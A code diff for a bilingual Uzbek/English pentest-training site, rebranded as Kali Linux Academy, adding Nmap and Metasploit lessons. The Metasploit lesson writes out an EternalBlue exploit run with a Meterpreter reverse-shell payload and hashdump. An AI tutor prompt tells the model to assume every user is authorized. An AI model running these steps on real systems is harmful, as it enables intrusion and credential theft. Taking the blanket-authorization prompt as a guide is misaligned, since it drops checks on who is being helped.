-      {name:"Packet Filter",uz:"Eng oddiy tur. IP, port va protokol asosida qaror qiladi. Stateless — har paketni alohida ko'radi.",en:"Simplest type. Decides based on IP, port and protocol. Stateless — sees each packet independently."},
-      {name:"Stateful Inspection",uz:"Ulanish holatini kuzatadi. TCP握手 sessiyalarini tushunadi. Ko'pchilik zamonaviy firewalllar shu turda.",en:"Tracks connection state. Understands TCP handshake sessions. Most modern firewalls use this."},
-      {name:"Application Layer (L7)",uz:"HTTP, DNS, FTP protokollarini chuqur tekshiradi. WAF (Web Application Firewall) shu turda.",en:"Deep inspection of HTTP, DNS, FTP protocols. WAF (Web Application Firewall) is this type."},
-      {name:"Next-Gen (NGFW)",uz:"IDS/IPS, DPI, SSL inspection va application awareness ni birlashtiradi.",en:"Combines IDS/IPS, DPI, SSL inspection and application awareness."},
-    ].map((f,i)=>React.createElement("div",{key:i,style:{marginBottom:8,padding:"12px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
-      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",marginBottom:4,fontWeight:700}},f.name),
-      React.createElement("div",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.6}},t(lang,f.uz,f.en))
-    )),
-    React.createElement(H2,{num:"§3"},t(lang,"iptables misoli (Linux)","iptables Example (Linux)")),
-    React.createElement(Terminal,null,
-`# Barcha trafikni ko'rish
-sudo iptables -L -v
+# Kernel va arxitektura
+uname -a
 
-# 22 (SSH) portni ochish
-sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+# Joriy foydalanuvchi kim?
+whoami
 
-# 80 (HTTP) portni ochish
-sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+# Kali'ni to'liq yangilash (rolling release)
+sudo apt update && sudo apt full-upgrade -y
 
-# Qolgan barcha kirishni bloklash
-sudo iptables -A INPUT -j DROP`)
-  );
-}
-
-// ── Lesson L22: Port Scanning ─────────────────────────────────
-function LessonL22(){
-  const lang=useLang();
-  return React.createElement("section",null,
-    React.createElement(H2,{num:"§1"},t(lang,"Port skanerlash nima?","What is Port Scanning?")),
-    React.createElement(P,null,t(lang,
-      "Port skanerlash — tarmoqdagi kompyuterlarning qaysi portlari ochiq yoki yopiqligini aniqlash jarayoni. Bu xavfsizlikni tekshirish va hujumchilar tomonidan ham keng qo'llaniladi.",
-      "Port scanning is the process of discovering which ports on network computers are open or closed. It's used in security testing and by attackers alike."
-    )),
-    React.createElement(H2,{num:"§2"},"Nmap — asosiy vosita"),
-    React.createElement(P,null,t(lang,
-      "Nmap (Network Mapper) — eng keng tarqalgan port skaneri. Ko'plab skanerlash texnikalarini qo'llab-quvvatlaydi.",
-      "Nmap (Network Mapper) is the most widely used port scanner, supporting many scanning techniques."
-    )),
-    React.createElement(Terminal,null,
-`# Tezkor skan (top 1000 port)
-nmap 192.168.1.1
-
-# Barcha portlarni skanerlash
-nmap -p- 192.168.1.1
-
-# Servis versiyalarini aniqlash
-nmap -sV 192.168.1.1
-
-# OS aniqlash + agressiv skan
-nmap -A 192.168.1.1
-
-# SYN (stealth) skan
-sudo nmap -sS 192.168.1.0/24
-
-# UDP skan
-sudo nmap -sU 192.168.1.1`),
+# O'rnatilgan xavfsizlik vositalarini ko'rish
+ls /usr/share/ | grep -iE 'nmap|metasploit|wordlists'`),
     React.createElement(InfoBox,{color:"var(--c-warn)"},
       React.createElement("strong",null,"⚠ "),
-      t(lang,"Faqat ruxsat berilgan tizimlarni skanerlang! Ruxsatsiz port skanerlash ko'pgina mamlakatlarda noqonuniy.","Only scan systems you have permission to test! Unauthorized port scanning is illegal in many countries.")
-    )
+      t(lang,
+        "Kali vositalari faqat siz egasi bo'lgan yoki yozma ruxsat olingan tizimlarda ishlatilishi kerak. Ruxsatsiz skanerlash yoki hujum ko'p mamlakatlarda jinoyat hisoblanadi.",
+        "Kali tools must only be used on systems you own or have written permission to test. Unauthorized scanning or attacks are a crime in most jurisdictions."
+      )
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Kali Linux qaysi distributiv asosida qurilgan?",en:"Which distribution is Kali Linux based on?"},
+      opts:["Arch Linux","Debian","Fedora","Gentoo"],
+      correct:1,
+      exp:{uz:"Kali Linux Debian asosida qurilgan va Offensive Security tomonidan ishlab chiqilgan.",en:"Kali Linux is built on Debian and developed by Offensive Security."}
+    })
+  );
+}
+
+// ── Lesson L11: Nmap ──────────────────────────────────────────
+function LessonL11(){
+  const lang=useLang();
+  const scans=[
+    {flag:"-sS",name:"TCP SYN (Stealth)",uz:"Yarim ochiq skan — to'liq ulanish o'rnatmaydi. Tez va nisbatan yashirin. root talab qiladi.",en:"Half-open scan — never completes the handshake. Fast and relatively stealthy. Needs root."},
+    {flag:"-sT",name:"TCP Connect",uz:"To'liq TCP ulanishi o'rnatiladi. root shart emas, lekin loglarda aniq ko'rinadi.",en:"Completes a full TCP connection. No root needed, but clearly appears in logs."},
+    {flag:"-sU",name:"UDP Scan",uz:"UDP portlarini skanerlaydi. Sekin, lekin DNS/SNMP/DHCP kabi xizmatlar uchun muhim.",en:"Scans UDP ports. Slow, but vital for services like DNS, SNMP and DHCP."},
+    {flag:"-sV",name:"Version Detection",uz:"Ochiq portdagi xizmat va uning aniq versiyasini aniqlaydi.",en:"Identifies the service and its exact version behind an open port."},
+    {flag:"-O",name:"OS Detection",uz:"TCP/IP steka xatti-harakati orqali operatsion tizimni taxmin qiladi.",en:"Fingerprints the operating system via TCP/IP stack behavior."},
+    {flag:"-sn",name:"Ping Scan",uz:"Faqat tirik xostlarni topadi — portlarni skanerlamaydi (host discovery).",en:"Host discovery only — finds live hosts without scanning ports."},
+    {flag:"-A",name:"Aggressive",uz:"Bir buyruqda: -sV, -O, default NSE skriptlar va traceroute.",en:"All-in-one: -sV, -O, default NSE scripts and traceroute."},
+  ];
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Nmap nima?","What is Nmap?")),
+    React.createElement(P,null,t(lang,
+      "Nmap (Network Mapper) — tarmoqni kashf qilish va xavfsizlik auditi uchun eng mashhur ochiq kodli vosita. U qaysi xostlar tirik ekanini, qaysi portlar ochiqligini, ular ortida qanday xizmat va versiyalar ishlayotganini hamda hatto operatsion tizimni ham aniqlay oladi. Kali'da oldindan o'rnatilgan.",
+      "Nmap (Network Mapper) is the most popular open-source tool for network discovery and security auditing. It reveals which hosts are alive, which ports are open, what services and versions run behind them, and can even fingerprint the OS. It comes pre-installed on Kali."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Skan turlari","Scan types")),
+    scans.map((s,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
+      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"2px 8px",flexShrink:0,minWidth:38,textAlign:"center"}},s.flag),
+      React.createElement("div",{style:{flex:1}},
+        React.createElement("div",{style:{fontWeight:700,fontSize:12.5,color:"var(--text-0)",marginBottom:2}},s.name),
+        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,s.uz,s.en))
+      )
+    )),
+    React.createElement(H2,{num:"§3"},t(lang,"Haqiqiy buyruqlar","Real commands")),
+    React.createElement(Terminal,null,
+`# Tezkor skan — eng mashhur 1000 port
+nmap 10.10.10.5
+
+# Barcha 65535 TCP portni skanerlash
+nmap -p- 10.10.10.5
+
+# SYN stealth skan (root kerak)
+sudo nmap -sS 10.10.10.5
+
+# Xizmat versiyalari + OS aniqlash + default skriptlar
+sudo nmap -sV -O -sC 10.10.10.5
+
+# Butun quyi tarmoqdagi tirik xostlarni topish
+nmap -sn 192.168.1.0/24
+
+# Aniq portlar + agressiv skan
+nmap -A -p 22,80,443 10.10.10.5
+
+# NSE skript: ma'lum zaifliklarni tekshirish
+nmap --script vuln 10.10.10.5
+
+# Sekin/yashirin timing + barcha formatlarda saqlash
+sudo nmap -sS -T2 -oA scan_natija 10.10.10.5`),
+    React.createElement(H2,{num:"§4"},t(lang,"Timing va natijalar","Timing & output")),
+    React.createElement(P,null,t(lang,
+      "Timing shablonlari -T0 (paranoid, juda sekin) dan -T5 (insane, juda tez) gacha skan tezligini boshqaradi. Yashirinlik kerak bo'lganda -T1/-T2, tezlik kerak bo'lganda -T4 ishlatiladi. Natijani -oN (oddiy), -oX (XML), -oG (grep) yoki -oA (barcha formatlar) bilan saqlash mumkin.",
+      "Timing templates from -T0 (paranoid, very slow) to -T5 (insane, very fast) control scan speed. Use -T1/-T2 for stealth, -T4 for speed. Save results with -oN (normal), -oX (XML), -oG (grepable) or -oA (all formats at once)."
+    )),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"Faqat yozma ruxsat berilgan tizimlarni skanerlang! Ruxsatsiz port skanerlash ko'p mamlakatlarda noqonuniy hisoblanadi.","Only scan systems you have written permission to test! Unauthorized port scanning is illegal in many countries.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Qaysi nmap bayrog'i yashirin SYN (half-open) skanni bajaradi?",en:"Which nmap flag performs a stealth SYN (half-open) scan?"},
+      opts:["-sT","-sS","-sU","-sn"],
+      correct:1,
+      exp:{uz:"-sS SYN skani to'liq ulanishni o'rnatmaydi, shuning uchun tez va nisbatan yashirin. root huquqi kerak.",en:"-sS never completes the TCP handshake, making it fast and relatively stealthy. It requires root."}
+    })
+  );
+}
+
+// ── Lesson L21: Metasploit Framework ─────────────────────────
+function LessonL21(){
+  const lang=useLang();
+  const mods=[
+    {name:"exploit",uz:"Muayyan zaiflikdan foydalanib nishonga kirish uchun ishlatiladigan kod.",en:"Code that leverages a specific vulnerability to gain access to a target."},
+    {name:"payload",uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod (masalan, Meterpreter).",en:"Code executed on the target after a successful exploit (e.g., Meterpreter)."},
+    {name:"auxiliary",uz:"Skanerlash, fuzzing, DoS — payloadsiz yordamchi modullar.",en:"Scanners, fuzzers, DoS — helper modules without a payload."},
+    {name:"post",uz:"Kirishdan keyingi ishlar: ma'lumot yig'ish, pivoting, imtiyozlarni oshirish.",en:"Post-exploitation: data gathering, pivoting, privilege escalation."},
+    {name:"encoder",uz:"Payloadni imzoga asoslangan aniqlashdan yashirish uchun kodlash.",en:"Encodes payloads to evade signature-based detection."},
+  ];
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Metasploit nima?","What is Metasploit?")),
+    React.createElement(P,null,t(lang,
+      "Metasploit Framework — ekspluatatsiya, payload yetkazish va post-ekspluatatsiya uchun modulli platforma. U dunyodagi eng keng ishlatiladigan pentest freymvorki bo'lib, Kali'da oldindan o'rnatilgan. Asosiy interfeysi — msfconsole. Modullar bir necha turga bo'linadi:",
+      "The Metasploit Framework is a modular platform for exploitation, payload delivery and post-exploitation. It is the most widely used pentest framework in the world and comes pre-installed on Kali. Its main interface is msfconsole. Modules are grouped into several types:"
+    )),
+    mods.map((m,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
+      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,color:"var(--c-attack)",background:"rgba(255,58,94,0.1)",border:"1px solid rgba(255,58,94,0.3)",borderRadius:6,padding:"2px 8px",flexShrink:0,minWidth:70,textAlign:"center"}},m.name),
+      React.createElement("div",{style:{flex:1,fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,m.uz,m.en))
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"msfconsole ish oqimi","msfconsole workflow")),
+    React.createElement(P,null,t(lang,
+      "Tipik ekspluatatsiya ketma-ketligi: ma'lumotlar bazasini ishga tushirish → modul qidirish → modulni tanlash → sozlamalarni to'ldirish → payload belgilash → ishga tushirish. Quyida EternalBlue (MS17-010) misolida real buyruqlar keltirilgan:",
+      "A typical exploitation sequence: start the database -> search for a module -> select it -> fill in options -> set a payload -> run. Below are the real commands using the EternalBlue (MS17-010) example:"
+    )),
+    React.createElement(Terminal,null,
+`# 1) PostgreSQL bazasini ishga tushirish
+sudo systemctl start postgresql
+sudo msfdb init
+
+# 2) Metasploit konsolini ochish
+msfconsole
+
+# 3) Modul qidirish
+msf6 > search eternalblue
+
+# 4) Modulni tanlash
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# 5) Kerakli sozlamalarni ko'rish
+msf6 exploit(ms17_010) > show options
+
+# 6) Nishon va lokal manzilni belgilash
+msf6 exploit(ms17_010) > set RHOSTS 10.10.10.40
+msf6 exploit(ms17_010) > set LHOST 10.10.14.2
+
+# 7) Payload tanlash
+msf6 exploit(ms17_010) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 8) Ekspluatatsiyani ishga tushirish
+msf6 exploit(ms17_010) > exploit`),
+    React.createElement(H2,{num:"§3"},t(lang,"Meterpreter asoslari","Meterpreter basics")),
+    React.createElement(P,null,t(lang,
+      "Ekspluatatsiya muvaffaqiyatli bo'lsa, siz Meterpreter sessiyasiga tushasiz — bu kuchli, xotirada ishlaydigan post-ekspluatatsiya shelli. Asosiy buyruqlar:",
+      "On a successful exploit you land in a Meterpreter session — a powerful, in-memory post-exploitation shell. Core commands:"
+    )),
+    React.createElement(Terminal,null,
+`meterpreter > sysinfo        # tizim ma'lumoti
+meterpreter > getuid         # joriy foydalanuvchi
+meterpreter > hashdump       # parol xeshlarini olish
+meterpreter > migrate 1234   # boshqa jarayonga o'tish
+meterpreter > shell          # to'liq tizim shelliga o'tish
+meterpreter > background     # sessiyani fon rejimiga o'tkazish`),
+    React.createElement(InfoBox,{color:"var(--c-attack)"},
+      React.createElement("strong",null,t(lang,"Axloqiy foydalanish: ","Ethical use: ")),
+      t(lang,
+        "Metasploit — kuchli hujum vositasi. Uni FAQAT siz egasi bo'lgan yoki yozma ruxsat (scope) olingan tizimlarda, o'quv laboratoriyalarida (masalan, Metasploitable, HackTheBox, TryHackMe) ishlatib o'rganing. Ruxsatsiz ekspluatatsiya jiddiy jinoiy javobgarlikka olib keladi.",
+        "Metasploit is a powerful offensive tool. Use it ONLY on systems you own or have written authorization (scope) for, and on training labs (e.g., Metasploitable, HackTheBox, TryHackMe). Unauthorized exploitation carries serious criminal liability."
+      )
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Metasploit'da ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"In Metasploit, what module type is the code that runs on the target after a successful exploit?"},
+      opts:[{uz:"Ekspluatatsiya (exploit)",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Yordamchi (auxiliary)",en:"Auxiliary"},{uz:"Enkoder (encoder)",en:"Encoder"}],
+      correct:1,
+      exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan, Meterpreter reverse shell).",en:"The payload is the code executed on the target once the exploit succeeds (e.g., a Meterpreter reverse shell)."}
+    })
   );
 }
 
@@ -286,25 +372,28 @@ sudo nmap -sU 192.168.1.1`),
 function ComingSoon({lesson}){
   const lang=useLang();
   return React.createElement("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-3)"}},
-    React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🔧"),
+    React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🐉"),
     React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:20,fontWeight:700,color:"var(--text-1)",marginBottom:8}},
       t(lang,"Tez kunda","Coming Soon")),
     React.createElement("div",{style:{fontSize:13,color:"var(--text-2)"}},
-      lesson?.uz||lesson?.en||"")
+      lesson?(t(lang,lesson.uz,lesson.en||lesson.uz)):"")
   );
 }
 
 // ── TopNav ────────────────────────────────────────────────────
-function TopNav({setRoute,user,onOpenProfile,onOpenAI}){
+function TopNav({setRoute,user,onOpenProfile,onOpenAI,setLang}){
   const lang=useLang();
   return React.createElement("nav",{style:{position:"sticky",top:0,zIndex:100,height:60,background:"rgba(4,6,13,0.92)",backdropFilter:"blur(12px)",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",padding:"0 24px",gap:12}},
     React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",display:"flex",alignItems:"center",gap:8,color:"var(--accent)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,letterSpacing:1,padding:0}},
-      React.createElement(Icon,{name:"network",size:16}),
-      "NETWORK ACADEMY"
+      React.createElement(Icon,{name:"terminal",size:16}),
+      "KALI ACADEMY"
     ),
     React.createElement("div",{style:{flex:1}}),
+    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},
+      lang==="uz"?"UZ":"EN"
+    ),
     user&&React.createElement("button",{onClick:onOpenProfile,style:{appearance:"none",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700}},
-      user.name?.slice(0,2).toUpperCase()||"NA"
+      user.name?.slice(0,2).toUpperCase()||"KA"
     ),
     React.createElement("button",{onClick:onOpenAI,style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontSize:13,display:"flex",alignItems:"center",gap:4}},
       React.createElement(Icon,{name:"spark",size:13})," AI"
@@ -313,27 +402,29 @@ function TopNav({setRoute,user,onOpenProfile,onOpenAI}){
 }
 
 // ── Landing Screen ────────────────────────────────────────────
-function LandingScreen({setRoute}){
+function LandingScreen({setRoute,setLang}){
   const lang=useLang();
-  return React.createElement("div",{style:{minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}},
+  return React.createElement("div",{style:{position:"relative",minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}},
+    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{position:"absolute",top:20,right:20,appearance:"none",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700}},
+      lang==="uz"?"UZ | EN":"EN | UZ"),
     React.createElement("div",{style:{maxWidth:600}},
       React.createElement("div",{style:{width:72,height:72,borderRadius:20,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px",boxShadow:"0 0 32px var(--accent-glow)"}},
-        React.createElement(Icon,{name:"network",size:32,style:{color:"var(--accent)"}})
+        React.createElement(Icon,{name:"terminal",size:32,style:{color:"var(--accent)"}})
       ),
       React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",letterSpacing:3,marginBottom:12}},
-        "NETWORK ACADEMY v1.0"
+        "KALI LINUX ACADEMY v1.0"
       ),
       React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:"clamp(28px,5vw,48px)",fontWeight:900,margin:"0 0 16px",lineHeight:1.15}},
-        t(lang,"Tarmoq Xavfsizligini","Network Security"),
+        t(lang,"Kali Linux'ni","Master"),
         React.createElement("br",null),
-        React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#4d8bff)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},
-          t(lang,"O'rganing","Mastered")
+        React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#c084fc)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},
+          t(lang,"Egallang","Kali Linux")
         )
       ),
       React.createElement("p",{style:{fontSize:15,color:"var(--text-2)",marginBottom:32,lineHeight:1.7}},
         t(lang,
-          "OSI modelidan tarmoq hujumlarigacha — 30 ta dars, amaliy laboratoriyalar va AI muallim bilan professional darajaga yetishing.",
-          "From OSI model to network attacks — 30 lessons, hands-on labs and AI tutor to reach professional level."
+          "Kali asoslaridan Metasploit'gacha — 30 ta dars, real terminal buyruqlari va AI muallim bilan professional pentester bo'ling.",
+          "From Kali basics to Metasploit — 30 lessons, real terminal commands and an AI tutor to become a professional pentester."
         )
       ),
       React.createElement("div",{style:{display:"flex",gap:12,justifyContent:"center",flexWrap:"wrap"}},
@@ -342,12 +433,12 @@ function LandingScreen({setRoute}){
           style:{padding:"14px 32px",borderRadius:12,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:15,fontWeight:700,boxShadow:"0 0 24px var(--accent-glow)"}
         },t(lang,"Boshlash →","Start →")),
         React.createElement("a",{
-          href:"../Windows/index.html",
+          href:"../index.html",
           style:{padding:"14px 24px",borderRadius:12,cursor:"pointer",appearance:"none",background:"transparent",border:"1px solid var(--border)",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:12,fontWeight:600,textDecoration:"none",display:"flex",alignItems:"center",gap:6}
-        },React.createElement(Icon,{name:"layers",size:13})," Windows Academy")
+        },"← CyberSecurity")
       ),
       React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,marginTop:48}},
-        [{icon:"network",n:"30",uz:"Dars",en:"Lessons"},{icon:"cpu",n:"3",uz:"Bo'lim",en:"Sections"},{icon:"star",n:"∞",uz:"XP",en:"XP"}].map((s,i)=>
+        [{icon:"terminal",n:"30",uz:"Dars",en:"Lessons"},{icon:"target",n:"3",uz:"Bo'lim",en:"Sections"},{icon:"star",n:"∞",uz:"XP",en:"XP"}].map((s,i)=>
           React.createElement("div",{key:i,style:{padding:16,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12}},
             React.createElement(Icon,{name:s.icon,size:20,style:{color:"var(--accent)",display:"block",margin:"0 auto 8px"}}),
             React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:18,fontWeight:900,color:"var(--text-0)"}},s.n),
@@ -419,7 +510,7 @@ function SectionScreen({setRoute,user,sec=1}){
         t(lang,section.descUz,section.descEn))
     ),
     lessons.map(l=>{
-      const key=`na_l${l.num.slice(1)}`;
+      const key=`ka_l${l.num.slice(1)}`;
       const done=completed.includes(key);
       return React.createElement("div",{key:l.num,
         onClick:()=>setRoute({name:"lesson",num:parseInt(l.num.slice(1))}),
@@ -443,13 +534,13 @@ function LessonScreen({setRoute,user,markComplete,num=1}){
   const lang=useLang();
   const [done,setDone]=useState(false);
   const lesson=LESSONS[num]||LESSONS[1];
-  const lessonKey=`na_l${String(num).padStart(2,"0")}`;
+  const lessonKey=`ka_l${String(num).padStart(2,"0")}`;
   const alreadyDone=(user?.completedLessons||[]).includes(lessonKey);
   const sec=SECTIONS[lesson.sec];
 
   const content=num===1?React.createElement(LessonL01):
-    num===13?React.createElement(LessonL13):
-    num===22?React.createElement(LessonL22):
+    num===11?React.createElement(LessonL11):
+    num===21?React.createElement(LessonL21):
     React.createElement(ComingSoon,{lesson});
 
   return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
@@ -464,7 +555,7 @@ function LessonScreen({setRoute,user,markComplete,num=1}){
       React.createElement("div",{style:{fontSize:12,color:"var(--text-2)"}},lesson.sub)
     ),
     content,
-    !alreadyDone&&!done&&num<=3&&React.createElement("button",{
+    !alreadyDone&&!done&&React.createElement("button",{
       onClick:()=>{markComplete&&markComplete(lessonKey);setDone(true);},
       style:{marginTop:24,padding:"12px 28px",borderRadius:10,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,boxShadow:"0 0 20px var(--accent-glow)"}
     },t(lang,"Darsni yakunlash ✓","Complete Lesson ✓")),
@@ -487,7 +578,7 @@ function ProfileModal({user,theme,setTheme,onSave,onClose,lang}){
   const [nKey,setNKey]=useState("");
   const [showKey,setShowKey]=useState(false);
   const PROVS=[{id:"groq",label:"Groq",hint:"gsk_...",free:true},{id:"openai",label:"OpenAI",hint:"sk-..."},{id:"anthropic",label:"Claude",hint:"sk-ant-..."},{id:"gemini",label:"Gemini",hint:"AIza..."}];
-  const THEMES=["blue","green","purple"];
+  const THEMES=["violet","cyan","green"];
   const save=()=>{onSave({name:name.trim()||"Student"});setSaved(true);setTimeout(()=>setSaved(false),1800);};
   const addKey=()=>{
     if(!nProv||!nKey.trim()||aiKeys.length>=3)return;
@@ -521,7 +612,7 @@ function ProfileModal({user,theme,setTheme,onSave,onClose,lang}){
           React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
             t(lang,"// RANG_MAVZU","// THEME")),
           React.createElement("div",{style:{display:"flex",gap:8}},
-            THEMES.map(th=>{const colors={blue:"#00d4ff",green:"#00ff88",purple:"#c084fc"};return React.createElement("button",{key:th,onClick:()=>setTheme(th),style:{flex:1,padding:"8px 0",borderRadius:8,cursor:"pointer",appearance:"none",border:`2px solid ${theme===th?colors[th]:"var(--border)"}`,background:theme===th?`${colors[th]}18`:"var(--bg-2)",color:theme===th?colors[th]:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,textTransform:"capitalize"}},th);})
+            THEMES.map(th=>{const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};return React.createElement("button",{key:th,onClick:()=>setTheme(th),style:{flex:1,padding:"8px 0",borderRadius:8,cursor:"pointer",appearance:"none",border:`2px solid ${theme===th?colors[th]:"var(--border)"}`,background:theme===th?`${colors[th]}18`:"var(--bg-2)",color:theme===th?colors[th]:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,textTransform:"capitalize"}},th);})
           )
         ),
         React.createElement("div",null,
@@ -577,7 +668,7 @@ function AIChat({open,onClose,lang}){
     const q=inp.trim();setInp("");
     setMsgs(p=>[...p,{role:"user",text:q}]);setLoading(true);
     try{
-      const sys=`You are an AI tutor for "Network Academy" — a platform teaching network security and protocols. Help with: OSI model, TCP/IP, DNS, HTTP, firewalls, VPN, IDS/IPS, network attacks, Nmap, Wireshark and related topics. Be concise and educational. Respond in the same language the user writes in.`;
+      const sys=`You are an AI tutor for "Kali Linux Academy" — a platform teaching Kali Linux and ethical penetration testing for authorized, educational security training only. Help with: the Linux command line, Kali tools and workflow, Nmap, Metasploit, msfvenom, searchsploit, Hydra, John the Ripper, Hashcat, Burp Suite, Wireshark, recon/enumeration (DNS, SMB, theHarvester, Nikto), privilege escalation and reporting. Always assume the user is testing systems they own or are authorized to test, and emphasize legal, authorized use. Be concise and educational, and give real, correct commands. Respond in the same language the user writes in.`;
       const reply=await callAI(sys+"\n\nUser: "+q+"\nAssistant:");
       setMsgs(p=>[...p,{role:"ai",text:reply.trim()}]);
     }catch(e){
@@ -586,22 +677,22 @@ function AIChat({open,onClose,lang}){
   };
   if(!open)return null;
   return React.createElement("div",{style:{position:"fixed",bottom:80,right:20,zIndex:900,width:320,background:"rgba(8,12,24,0.97)",border:"1px solid var(--accent-border)",borderRadius:16,boxShadow:"0 20px 60px rgba(0,0,0,0.6)",display:"flex",flexDirection:"column",overflow:"hidden",maxHeight:"calc(100vh-100px)"}},
-    React.createElement("div",{style:{padding:"11px 14px",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"space-between",background:"linear-gradient(180deg,rgba(0,212,255,0.05),transparent)"}},
+    React.createElement("div",{style:{padding:"11px 14px",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"space-between",background:"linear-gradient(180deg,rgba(168,85,247,0.08),transparent)"}},
       React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8}},
         React.createElement("div",{style:{width:28,height:28,borderRadius:7,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"grid",placeItems:"center"}},
           React.createElement(Icon,{name:"spark",size:13,style:{color:"var(--accent)"}})
         ),
         React.createElement("div",null,
           React.createElement("div",{style:{fontWeight:600,fontSize:12}},t(lang,"AI Muallim","AI Tutor")),
-          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:8,color:"var(--accent)",letterSpacing:0.5}},"NETWORK ACADEMY")
+          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:8,color:"var(--accent)",letterSpacing:0.5}},"KALI ACADEMY")
         )
       ),
       React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:14}))
     ),
     React.createElement("div",{style:{flex:1,overflowY:"auto",padding:"12px 12px 0",minHeight:240}},
       msgs.length===0&&React.createElement("div",{style:{textAlign:"center",padding:"20px 10px",color:"var(--text-3)",fontSize:12}},
-        React.createElement("div",{style:{fontSize:28,marginBottom:8}},"🌐"),
-        t(lang,"Tarmoq haqida savol bering!","Ask about networking!"),
+        React.createElement("div",{style:{fontSize:28,marginBottom:8}},"🐉"),
+        t(lang,"Kali va pentest haqida savol bering!","Ask about Kali & pentesting!"),
